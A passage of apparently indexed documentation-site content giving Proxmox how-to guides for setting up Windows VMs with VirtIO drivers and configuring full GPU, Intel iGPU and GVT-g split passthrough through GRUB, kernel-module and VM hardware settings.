Virtual Machines with VirtIO Disks and Networking using Proxmox. This configuration was tested to work with the <code>GPU passthroughs</code> feature from one of the following guides:</p> <ul> <li>GPU Passthrough to VM - Full GPU passthrough to VM guide</li> <li>iGPU Passthrough to VM - Cpu's GPU passthrough to VM guide (Intel)</li> <li>iGPU Split Passthrough - Splitting (CPU's GPU) to Multiple GPUs passthrough to VM guide</li> </ul>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#prerequirements", "title": "Prerequirements", "text": "<p>Before we begin, we need to download the VirtIO Drivers for Windows <code>iso</code>. Upload it via the GUI as any other ISO file.</p> <p>You can allso use ssh and download it directly from the Proxmox server.</p> <pre><code>wget -P /var/lib/vz/template/iso https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win.iso\n</code></pre>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#create-a-vm-in-proxmox", "title": "Create a VM in Proxmox", "text": "<p>Create a Virutal Machine in Proxmox as usual.</p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#general", "title": "General", "text": "<p>Select <code>Advanced</code> options.</p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#os", "title": "OS", "text": "<p>Choose the iso file image for Windows 10 or 11. Change <code>Type</code> to <code>Microsoft Windows</code> and <code>Version</code> to your's windows version.</p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#system", "title": "System", "text": "<p>Change the Machine type to <code>q35</code>, BIOS to <code>UEFI</code>. Add TPM for Windows 11. Alocate Storage for UEFI BIOS and TPM.</p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#disks", "title": "Disks", "text": "<p>Set Bus/Device to <code>VirtIO Block</code> and Cache to <code>Write Through</code>. Select the storage disk and the VM's disk size.</p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#cpu", "title": "CPU", "text": "<p>Choose how many cores you want to use. Set The cpu Type to <code>Host</code></p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#memory", "title": "Memory", "text": "<p>Alocate the memory for the VM. Make sure the <code>Ballooning Device</code> is enabled.</p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#network", "title": "Network", "text": "<p>Select your preferred network interface. Set the Model to <code>VirtIO (paravirtualized)</code>.</p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#confirm", "title": "Confirm", "text": "<p>Don't Start the VM after creating it.</p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#add-cddvd-to-vm", "title": "Add CD/DVD to VM", "text": "<p>We will need to use the VirtIO Drivers for Windows <code>iso</code> file to install the drivers while installing the Windows VM.</p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#hardware-before-installation", "title": "Hardware Before Installation", "text": "<p>This how the hardware of the VM should look like befor starting the Windows installation.</p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#windows-installation", "title": "Windows Installation", "text": "<p>The Windows installation process is the same as any other Windows OS installation. The only caveat is that you need to install the drivers for the Storage devices and Network devices.</p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#choose-custom-install-windows-only-advanced", "title": "Choose Custom: Install Windows only (advanced)", "text": "", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#missing-storage-devices", "title": "Missing Storage Devices", "text": "<p>When prompted to select the storage device to install windows the device won't show since we are using the VirtIO storage. Select <code>Load Driver</code>. </p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#load-the-virtio-drivers", "title": "Load the VirtIO Drivers", "text": "<p>Browse to the VirtIO Disk find a folder called <code>viostor</code> and select the appropriate windows driver.</p> <p></p> <p>You should see the a Red Hat VirtIO driver selected. Click <code>Next</code> and install the driver.</p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#continue-with-the-installation-as-usual", "title": "Continue with the installation as usual", "text": "", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#missing-network-driver", "title": "Missing Network Driver", "text": "<p>Windows won't be able to load network drivers while installing. When prompted with something for connecting to the Internet, select <code>I Don't have internet</code> and skip it. We will deal with the network drivers at post installation.</p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#post-installation", "title": "Post Installation", "text": "", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#install-all-the-virtio-drivers-for-windows", "title": "Install all the VirtIO Drivers for Windows", "text": "<p>Open the VirtIO CD and run the <code>virtio-win-gt-x64.exe</code>, <code>virtio-win-guest-tools</code> installer. This will install all the missing virtio drivers for the VM and guest OS tools.</p> <p></p> <p>After the installtion your Device Manager should look like this without any errors.</p> <p></p>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/#remove-the-virtio-cddvd-and-windows-iso", "title": "Remove the VirtIO CD/DVD and Windows iso", "text": "<p>Power off the VM.</p> <p>Remove the added CD/DVD for VirtIO iso.</p> <p></p> <p>Select <code>Do nor use any media</code> on the CD/DVD with the Windows iso.</p> <p></p> <p>At this point we are done with the installation of the Windows VM.</p> <p>Follow those guides for utilizing a GPU passthrough to VM:</p> <ul> <li>GPU Passthrough to VM - Full GPU passthrough to VM guide</li> <li>iGPU Passthrough to VM - Cpu's GPU passthrough to VM guide (Intel)</li> <li>[GPU Split Passthrough][gpu-split-passthrough] - Splitting (Nvidia) to Multiple GPUs passthrough to VM guide</li> </ul>", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"]}, {"location": "infrastructure/proxmox/gpu-passthrough/gpu-passthrough-to-vm/", "title": "Proxmox GPU Passthrough to VM", "text": "", "tags": ["proxmox", "gpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/gpu-passthrough-to-vm/#introduction", "title": "Introduction", "text": "<p>GPU passthrough is a technology that allows the Linux kernel to present the internal PCI GPU directly to the virtual machine. The device behaves as if it were powered directly by the virtual machine, and the virtual machine detects the PCI device as if it were physically connected. We will cover how to enable GPU passthrough to a virtual machine in Proxmox VE.</p> <p>Your mileage may vary depending on your hardware.</p>", "tags": ["proxmox", "gpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/gpu-passthrough-to-vm/#proxmox-configuration-for-gpu-passthrough", "title": "Proxmox Configuration for GPU Passthrough", "text": "<p>The following examples uses <code>SSH</code> connection to the Proxmox server. The editor is <code>nano</code> but feel free to use any other editor. We will be editing the <code>grub</code> configuration file.</p> <p>Find the PCI address of the GPU Device. The following command will show the PCI address of the GPU devices in Proxmox server:</p> <pre><code>lspci -nnv | grep VGA\n</code></pre> <p>Find the GPU you want to passthrough in result ts should be similar to this:</p> <pre><code>01:00.0 VGA compatible controller [0300]: NVIDIA Corporation TU104 [GeForce RTX 2080 SUPER] [10de:1e81] (rev a1) (prog-if 00 [VGA controller])\n</code></pre> <p>What we are looking is the PCI address of the GPU device. In this case it's <code>01:00.0</code>. <code>01:00.0</code> is only a part of of a group of PCI devices on the GPU. We can list all the devices in the group <code>01:00</code> by using the following command:</p> <pre><code>lspci -s 01:00\n</code></pre> <p>The usual output will include VGA Device and Audio Device. In my case, we have a USB Controller and a Serial bus controller:</p> <pre><code>01:00.0 VGA compatible controller: NVIDIA Corporation TU104 [GeForce RTX 2080 SUPER] (rev a1)\n01:00.1 Audio device: NVIDIA Corporation TU104 HD Audio Controller (rev a1)\n01:00.2 USB controller: NVIDIA Corporation TU104 USB 3.1 Host Controller (rev a1)\n01:00.3 Serial bus controller [0c80]: NVIDIA Corporation TU104 USB Type-C UCSI Controller (rev a1)\n</code></pre> <p>Now we need to get the id's of those devices. We can do this by using the following command:</p> <pre><code>lspci -s 01:00 -n\n</code></pre> <p>The output should look similar to this:</p> <pre><code>01:00.0 0300: 10de:1e81 (rev a1)\n01:00.1 0403: 10de:10f8 (rev a1)\n01:00.2 0c03: 10de:1ad8 (rev a1)\n01:00.3 0c80: 10de:1ad9 (rev a1)\n</code></pre> <p>What we are looking are the pairs, we will use those id to split the PCI Group to separate devices.</p> <pre><code>10de:1e81,10de:10f8,10de:1ad8,10de:1ad9\n</code></pre> <p>Now it's time to edit the <code>grub</code> configuration file.</p> <pre><code>nano /etc/default/grub\n</code></pre> <p>Find the line that starts with <code>GRUB_CMDLINE_LINUX_DEFAULT</code> by default they should look like this:</p> <pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet\"\n</code></pre> For Intel CPUFor AMD CPU <pre><code>intel_iommu=on\n</code></pre> <pre><code>amd_iommu=on\n</code></pre> <p>Then change it to look like this (Intel CPU example) and replace <code>vfio-pci.ids=</code> with the ids for the GPU you want to passthrough:</p> <pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet intel_iommu=on pcie_acs_override=downstream,multifunction video=efifb:off video=vesa:off vfio-pci.ids=10de:1e81,10de:10f8,10de:1ad8,10de:1ad9 vfio_iommu_type1.allow_unsafe_interrupts=1 kvm.ignore_msrs=1 modprobe.blacklist=radeon,nouveau,nvidia,nvidiafb,nvidia-gpu\"\n</code></pre> <p>Save the config changed and then update GRUB.</p> <pre><code>update-grub\n</code></pre> <p>Next we need to add <code>vfio</code> modules to allow PCI passthrough.</p> <p>Edit the <code>/etc/modules</code> file.</p> <pre><code>nano /etc/modules\n</code></pre> <p>Add the following line to the end of the file:</p> <pre><code># Modules required for PCI passthrough\nvfio\nvfio_iommu_type1\nvfio_pci\nvfio_virqfd\n</code></pre> <p>Save and exit the editor.</p> <p>Update configuration changes made in your /etc filesystem</p> <pre><code>update-initramfs -u -k all\n</code></pre> <p>Reboot Proxmox to apply the changes</p> <p>Verify that IOMMU is enabled</p> <pre><code>dmesg | grep -e DMAR -e IOMMU\n</code></pre> <p>There should be a line that looks like <code>DMAR: IOMMU enabled</code>. If there is no output, something is wrong.</p> <pre><code>[0.000000] Warning: PCIe ACS overrides enabled; This may allow non-IOMMU protected peer-to-peer DMA\n[0.067203] DMAR: IOMMU enabled\n[2.573920] pci 0000:00:00.2: AMD-Vi: IOMMU performance counters supported\n[2.580393] pci 0000:00:00.2: AMD-Vi: Found IOMMU cap 0x40\n[2.581776] perf/amd_iommu: Detected AMD IOMMU #0 (2 banks, 4 counters/bank).\n</code></pre> <p>Check that the GPU is in a separate IOMMU Group by using the following command:</p> <pre><code>#!/bin/bash\nshopt -s nullglob\nfor g in $(find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V); do\n    echo \"IOMMU Group ${g##*/}:\"\n    for d in $g/devices/*; do\n        echo -e \"\\t$(lspci -nns ${d##*/})\"\n    done;\ndone;\n</code></pre> <p>Now your Proxmox host should be ready to GPU passthrough!</p>", "tags": ["proxmox", "gpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/gpu-passthrough-to-vm/#windows-virtual-machine-gpu-passthrough-configuration", "title": "Windows Virtual Machine GPU Passthrough Configuration", "text": "<p>For better results its recommend to use this Windwos 10/11 Virutal Machine configuration for proxmox.</p> <p>Limitations &amp; Workarounds</p> <ul> <li> <p>In order for the GPU to to function properly in the VM, you must disable Proxmox's Virutal Display - Set it <code>none</code>.</p> </li> <li> <p>You will lose the ability to conect to the VM via Proxmox's Console.</p> </li> <li> <p>Display must be conected to the physical output of the GPU for the Windows Host to initialize the GPU properly.</p> </li> <li> <p>You can use a HDMI Dummy Plug as a workaround - It will present itself as a HDMI Display  to the Windows Host.</p> </li> <li> <p>Make sure you have alternative way to connect to the VM for example via Remote Desktop (RDP).</p> </li> </ul> <p>Find the PCI address of the GPU.</p> <pre><code>lspci -nnv | grep VGA\n</code></pre> <p>This should result in output similar to this:</p> <pre><code>01:00.0 VGA compatible controller [0300]: NVIDIA Corporation TU104 [GeForce RTX 2080 SUPER] [10de:1e81] (rev a1) (prog-if 00 [VGA controller])\n</code></pre> <p>If you have multiple VGA, look for the one that has the <code>Intel</code> in the name. Here, the PCI address of the GPU is <code>01:00.0</code>.</p> <p></p> <p>For best performance the VM should be configured the <code>Machine</code> type to q35. This will allow the VM to utilize PCI-Express passthrough.</p> <p>Open the web gui and navigate to the <code>Hardware</code> tab of the VM you want to add a vGPU. Click <code>Add</code> above the device list and then choose <code>PCI Device</code></p> <p></p> <p>Open the <code>Device</code> dropdown and select the GPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, <code>01:00.0</code> is listed as <code>0000:01:00.0</code>.</p> <p></p> <p>Select <code>All Functions</code>, <code>ROM-Bar</code>, <code>Primary GPU</code>, <code>PCI-Express</code> and then click <code>Add</code>.</p> <p></p> <p>The Windows Virtual Machine Proxmox Setting should look like this:</p> <p></p> <p>Power on the Windows Virtual Machine.</p> <p>Connect to the VM via Remote Desktop (RDP) or any other remote access protocol you prefer. Install the latest version of GPU Driver for your GPU.</p> <p>If all when well you should see the following output in <code>Device Manager</code> and GPU-Z:</p> <p></p> <p>That's it!</p>", "tags": ["proxmox", "gpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/gpu-passthrough-to-vm/#linux-virtual-machine-gpu-passthrough-configuration", "title": "Linux Virtual Machine GPU Passthrough Configuration", "text": "<p>We will be using Ubuntu Server 20.04 LTS. for this guide.</p> <p>From Proxmox Terminal find the PCI address of the GPU.</p> <pre><code>lspci -nnv | grep VGA\n</code></pre> <p>This should result in output similar to this:</p> <pre><code>01:00.0 VGA compatible controller [0300]: NVIDIA Corporation TU104 [GeForce RTX 2080 SUPER] [10de:1e81] (rev a1) (prog-if 00 [VGA controller])\n</code></pre> <p>If you have multiple VGA, look for the one that has the <code>Intel</code> in the name. Here, the PCI address of the GPU is <code>01:00.0</code>.</p> <p></p> <p>For best performance the VM should be configured the <code>Machine</code> type to q35. This will allow the VM to utilize PCI-Express passthrough.</p> <p></p> <p>Open the <code>Device</code> dropdown and select the GPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, <code>01:00.0</code> is listed as <code>0000:01:00.0</code>.</p> <p></p> <p>Select <code>All Functions</code>, <code>ROM-Bar</code>, <code>PCI-Epress</code> and then click <code>Add</code>.</p> <p></p> <p>The Ubuntu Virtual Machine Proxmox Setting should look like this:</p> <p></p> <p>Boot the VM. To test the GPU passthrough was successful, you can use the following command in the VM:</p> <pre><code> sudo lspci -nnv | grep VGA\n</code></pre> <p>The output should incliude the GPU:</p> <pre><code>01:00.0 VGA compatible controller [0300]: NVIDIA Corporation TU104 [GeForce RTX 2080 SUPER] [10de:1e81] (rev a1) (prog-if 00 [VGA controller])\n</code></pre> <p>Now we need to install the GPU Driver. I'll be covering the installation of Nvidia Drivers in the next example.</p> <p>Search for the latest Nvidia Driver for your GPU.</p> <pre><code>sudo apt search nvidia-driver\n</code></pre> <p>In the next step we will install the Nvidia Driver v535.</p> <p>Note</p> <p>--no-install-recommends is important for Headless Server. <code>nvidia-driver-535</code> will install xorg (GUI) <code>--no-install-recommends</code> flag will prevent the GUI from being installed.</p> <pre><code>sudo apt install --no-install-recommends -y build-essential nvidia-driver-535 nvidia-headless-535 nvidia-utils-535 nvidia-cuda-toolkit\n</code></pre> <p>This will take a while to install. After the installation is complete, you should reboot the VM.</p> <p>Now let's test the Driver initalization. Run the following command in the VM:</p> <pre><code>nvidia-smi &amp;&amp; nvidia-smi -L\n</code></pre> <p>If all went well you should see the following output:</p> <p></p> <p>That's it! You should now be able to use the GPU for hardware acceleration inside the VM.</p>", "tags": ["proxmox", "gpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/gpu-passthrough-to-vm/#debug", "title": "Debug", "text": "<p>Dbug Messages - Shows Hardware initialization and errors</p> <pre><code>dmesg -w\n</code></pre> <p>Display PCI devices information</p> <pre><code>lspci\n</code></pre> <p>Display Driver in use for PCI devices</p> <pre><code>lspci -k\n</code></pre> <p>Display IOMMU Groups the PCI devices are assigned to</p> <pre><code>#!/bin/bash\nshopt -s nullglob\nfor g in $(find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V); do\n    echo \"IOMMU Group ${g##*/}:\"\n    for d in $g/devices/*; do\n        echo -e \"\\t$(lspci -nns ${d##*/})\"\n    done;\ndone;\n</code></pre> <p>Reboot Proxmox to apply the changes</p>", "tags": ["proxmox", "gpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/", "title": "iGPU Passthrough to VM (Intel Integrated Graphics)", "text": "", "tags": ["proxmox", "igpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/#introduction", "title": "Introduction", "text": "<p>Intel Integrated Graphics (iGPU) is a GPU that is integrated into the CPU. The GPU is a part of the CPU and is used to render graphics. Proxmox may be configured to use iGPU passthrough to VM to allow the VM to use the iGPU for hardware acceleration for example using video encoding/decoding and Transcoding for series like Plex and Emby. This guide will show you how to configure Proxmox to use iGPU passthrough to VM.</p> <p>Your mileage may vary depending on your hardware. The following guide was tested with Intel Gen8 CPU.</p> <p>There are two ways to use iGPU passthrough to VM. The first way is to use the <code>Full iGPU Passthrough</code> to VM. The second way is to use the <code>iGPU GVT-g</code> technology which allows as to split the iGPU into two parts. We will be covering the <code>Full iGPU Passthrough</code>. If you want to use the split <code>iGPU GVT-g Passthrough</code> you can find the guide here.</p>", "tags": ["proxmox", "igpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/#proxmox-configuration-for-igpu-full-passthrough", "title": "Proxmox Configuration for iGPU Full Passthrough", "text": "<p>The following examples uses <code>SSH</code> connection to the Proxmox server. The editor is <code>nano</code> but feel free to use any other editor. We will be editing the <code>grub</code> configuration file.</p> <p>Edit the <code>grub</code> configuration file.</p> <pre><code>nano /etc/default/grub\n</code></pre> <p>Find the line that starts with <code>GRUB_CMDLINE_LINUX_DEFAULT</code> by default they should look like this:</p> <pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet\"\n</code></pre> <p>We want to allow <code>passthrough</code> and <code>Blacklists</code> known graphics drivers to prevent proxmox from utilizing the iGPU.</p> <p>Warning</p> <p>You will loose the ability to use the onboard graphics card to access the Proxmox's console since Proxmox won't be able to use the Intel's gpu</p> <p>Your <code>GRUB_CMDLINE_LINUX_DEFAULT</code> should look like this:</p> <pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet intel_iommu=on iommu=pt pcie_acs_override=downstream,multifunction initcall_blacklist=sysfb_init video=simplefb:off video=vesafb:off video=efifb:off video=vesa:off disable_vga=1 vfio_iommu_type1.allow_unsafe_interrupts=1 kvm.ignore_msrs=1 modprobe.blacklist=radeon,nouveau,nvidia,nvidiafb,nvidia-gpu,snd_hda_intel,snd_hda_codec_hdmi,i915\"\n</code></pre> <p>Note</p> <p>This will blacklist most of the graphics drivers from proxmox. If you have a specific driver you need to use for Proxmox Host you need to remove it from <code>modprobe.blacklist</code></p> <p>Save and exit the editor.</p> <p>Update the grub configuration to apply the changes the next time the system boots.</p> <pre><code>update-grub\n</code></pre> <p>Next we need to add <code>vfio</code> modules to allow PCI passthrough.</p> <p>Edit the <code>/etc/modules</code> file.</p> <pre><code>nano /etc/modules\n</code></pre> <p>Add the following line to the end of the file:</p> <pre><code># Modules required for PCI passthrough\nvfio\nvfio_iommu_type1\nvfio_pci\nvfio_virqfd\n</code></pre> <p>Update configuration changes made in your /etc filesystem</p> <pre><code>update-initramfs -u -k all\n</code></pre> <p>Save and exit the editor.</p> <p>Reboot Proxmox to apply the changes</p> <p>Verify that IOMMU is enabled</p> <pre><code>dmesg | grep -e DMAR -e IOMMU\n</code></pre> <p>There should be a line that looks like <code>DMAR: IOMMU enabled</code>. If there is no output, something is wrong.</p> <pre><code>[0.000000] Warning: PCIe ACS overrides enabled; This may allow non-IOMMU protected peer-to-peer DMA\n[0.067203] DMAR: IOMMU enabled\n[2.573920] pci 0000:00:00.2: AMD-Vi: IOMMU performance counters supported\n[2.580393] pci 0000:00:00.2: AMD-Vi: Found IOMMU cap 0x40\n[2.581776] perf/amd_iommu: Detected AMD IOMMU #0 (2 banks, 4 counters/bank).\n</code></pre>", "tags": ["proxmox", "igpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/#windows-virtual-machine-igpu-passthrough-configuration", "title": "Windows Virtual Machine iGPU Passthrough Configuration", "text": "<p>For better results its recommend to use this Windows 10/11 Virtual Machine configuration for proxmox.</p> <p>Find the PCI address of the iGPU.</p> <pre><code>lspci -nnv | grep VGA\n</code></pre> <p>This should result in output similar to this:</p> <pre><code>00:02.0 VGA compatible controller [0300]: Intel Corporation CometLake-S GT2 [UHD Graphics 630] [8086:3e92] (prog-if 00 [VGA controller])\n</code></pre> <p>If you have multiple VGA, look for the one that has the <code>Intel</code> in the name. Here, the PCI address of the iGPU is <code>00:02.0</code>.</p> <p></p> <p>For best performance the VM should be configured the <code>Machine</code> type to q35. This will allow the VM to utilize PCI-Express passthrough.</p> <p>Open the web gui and navigate to the <code>Hardware</code> tab of the VM you want to add a vGPU. Click <code>Add</code> above the device list and then choose <code>PCI Device</code></p> <p></p> <p>Open the <code>Device</code> dropdown and select the iGPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, <code>00:02.0</code> is listed as <code>0000:00:02.0</code>.</p> <p></p> <p>Select <code>All Functions</code>, <code>ROM-Bar</code>, <code>PCI-Express</code> and then click <code>Add</code>.</p> <p></p> <p>Tip</p> <p>I've found that the most consistent way to utilize the GPU acceleration is to disable Proxmox's Virtual Graphics card of the vm. The drawback of disabling the Virtual Graphics card is that it will not be able to access the vm via proxmox's vnc console. The workaround is to enable Remote Desktop (RDP) on the VM before disabling the Virtual Graphics card and accessing the VM via RDP or use any other remove desktop client. If you loose the ability to access the VM via RDP you can temporarily remove the GPU PCI Device and re-enable the virtual graphics card</p> <p>The Windows Virtual Machine Proxmox Setting should look like this:</p> <p></p> <p>Power on the Windows Virtual Machine.</p> <p>Connect to the VM via Remote Desktop (RDP) or any other remote access protocol you prefer. Install the latest version of Intel's Graphics Driver or use the Intel Driver &amp; Support Assistant installer.</p> <p>If all when well you should see the following output in <code>Device Manager</code> and GPU-Z:</p> <p></p> <p>That's it!</p>", "tags": ["proxmox", "igpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/#linux-virtual-machine-igpu-passthrough-configuration", "title": "Linux Virtual Machine iGPU Passthrough Configuration", "text": "<p>We will be using Ubuntu Server 20.04 LTS for this guide.</p> <p>From Proxmox Terminal find the PCI address of the iGPU.</p> <pre><code>lspci -nnv | grep VGA\n</code></pre> <p>This should result in output similar to this:</p> <pre><code>00:02.0 VGA compatible controller [0300]: Intel Corporation CometLake-S GT2 [UHD Graphics 630] [8086:3e92] (prog-if 00 [VGA controller])\n</code></pre> <p>If you have multiple VGA, look for the one that has the <code>Intel</code> in the name. Here, the PCI address of the iGPU is <code>00:02.0</code>.</p> <p></p> <p></p> <p>Open the <code>Device</code> dropdown and select the iGPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, <code>00:02.0</code> is listed as <code>0000:00:02.0</code>.</p> <p></p> <p>Select <code>All Functions</code>, <code>ROM-Bar</code> and then click <code>Add</code>.</p> <p></p> <p>The Ubuntu Virtual Machine Proxmox Setting should look like this:</p> <p></p> <p>Boot the VM. To test the iGPU passthrough was successful, you can use the following command:</p> <pre><code> sudo lspci -nnv | grep VGA\n</code></pre> <p>The output should include the Intel iGPU:</p> <pre><code>00:10.0 VGA compatible controller [0300]: Intel Corporation UHD Graphics 630 (Desktop) [8086:3e92] (prog-if 00 [VGA controller])\n</code></pre> <p>Now we need to check if the GPU's Driver initalization is working.</p> <pre><code>cd /dev/dri &amp;&amp; ls -la\n</code></pre> <p>The output should include the <code>renderD128</code></p> <p></p> <p>That's it! You should now be able to use the iGPU for hardware acceleration inside the VM and still have proxmox's output on the screen.</p>", "tags": ["proxmox", "igpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/#debug", "title": "Debug", "text": "<p>Dbug Messages - Shows Hardware initialization and errors</p> <pre><code>dmesg -w\n</code></pre> <p>Display PCI devices information</p> <pre><code>lspci\n</code></pre> <p>Display Driver in use for PCI devices</p> <pre><code>lspci -k\n</code></pre> <p>Display IOMMU Groups the PCI devices are assigned to</p> <pre><code>#!/bin/bash\nshopt -s nullglob\nfor g in $(find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V); do\n    echo \"IOMMU Group ${g##*/}:\"\n    for d in $g/devices/*; do\n        echo -e \"\\t$(lspci -nns ${d##*/})\"\n    done;\ndone;\n</code></pre>", "tags": ["proxmox", "igpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/", "title": "iGPU Split Passthrough (Intel Integrated Graphics)", "text": "", "tags": ["proxmox", "igpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/#introduction", "title": "Introduction", "text": "<p>Intel Integrated Graphics (iGPU) is a GPU that is integrated into the CPU. The GPU is a part of the CPU and is used to render graphics. Proxmox may be configured to use iGPU split passthrough to VM to allow the VM to use the iGPU for hardware acceleration for example using video encoding/decoding and Transcoding for series like Plex and Emby. This guide will show you how to configure Proxmox to use iGPU passthrough to VM.</p> <p>Your mileage may vary depending on your hardware. The following guide was tested with Intel Gen8 CPU.</p> <p>Supported CPUs</p> <p><code>iGPU GVT-g Split Passthrough</code> is supported only on Intel's 5<sup>th</sup> generation to 10<sup>th</sup> generation CPUs!</p> <p>Known supported CPU families:</p> <ul> <li> <p>Broadwell</p> </li> <li> <p>Skylake</p> </li> <li> <p>Kaby Lake</p> </li> <li> <p>Coffee Lake</p> </li> <li> <p>Comet Lake</p> </li> </ul> <p>There are two ways to use iGPU passthrough to VM. The first way is to use the <code>Full iGPU Passthrough</code> to VM. The second way is to use the <code>iGPU GVT-g</code> technology which allows as to split the iGPU into two parts. We will be covering the <code>Split iGPU Passthrough</code>. If you want to use the split <code>Full iGPU Passthrough</code> you can find the guide here.</p>", "tags": ["proxmox", "igpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/#proxmox-configuration-for-gvt-g-split-passthrough", "title": "Proxmox Configuration for GVT-g Split Passthrough", "text": "<p>The following examples uses <code>SSH</code> connection to the Proxmox server. The editor is <code>nano</code> but feel free to use any other editor. We will be editing the <code>grub</code> configuration file.</p> <p>Edit the <code>grub</code> configuration file.</p> <pre><code>nano /etc/default/grub\n</code></pre> <p>Find the line that starts with <code>GRUB_CMDLINE_LINUX_DEFAULT</code> by default they should look like this:</p> <pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet\"\n</code></pre> <p>We want to allow <code>passthrough</code> and <code>Blacklists</code> known graphics drivers to prevent proxmox from utilizing the iGPU.</p> <p>Your <code>GRUB_CMDLINE_LINUX_DEFAULT</code> should look like this:</p> <pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet intel_iommu=on i915.enable_gvt=1 iommu=pt pcie_acs_override=downstream,multifunction video=efifb:off video=vesa:off vfio_iommu_type1.allow_unsafe_interrupts=1 kvm.ignore_msrs=1 modprobe.blacklist=radeon,nouveau,nvidia,nvidiafb,nvidia-gpu\"\n</code></pre> <p>Note</p> <p>This will blacklist most of the graphics drivers from proxmox. If you have a specific driver you need to use for Proxmox Host you need to remove it from <code>modprobe.blacklist</code></p> <p>Save and exit the editor.</p> <p>Update the grub configuration to apply the changes the next time the system boots.</p> <pre><code>update-grub\n</code></pre> <p>Next we need to add <code>vfio</code> modules to allow PCI passthrough.</p> <p>Edit the <code>/etc/modules</code> file.</p> <pre><code>nano /etc/modules\n</code></pre> <p>Add the following line to the end of the file:</p> <pre><code># Modules required for PCI passthrough\nvfio\nvfio_iommu_type1\nvfio_pci\nvfio_virqfd\n\n# Modules required for Intel GVT-g Split\nkvmgt\n</code></pre> <p>Save and exit the editor.</p> <p>Update configuration changes made in your /etc filesystem</p> <pre><code>update-initramfs -u -k all\n</code></pre> <p>Reboot Proxmox to apply the changes</p> <p>Verify that IOMMU is enabled</p> <pre><code>dmesg | grep -e DMAR -e IOMMU\n</code></pre> <p>There should be a line that looks like <code>DMAR: IOMMU enabled</code>. If there is no output, something is wrong.</p> <pre><code>[0.000000] Warning: PCIe ACS overrides enabled; This may allow non-IOMMU protected peer-to-peer DMA\n[0.067203] DMAR: IOMMU enabled\n[2.573920] pci 0000:00:00.2: AMD-Vi: IOMMU performance counters supported\n[2.580393] pci 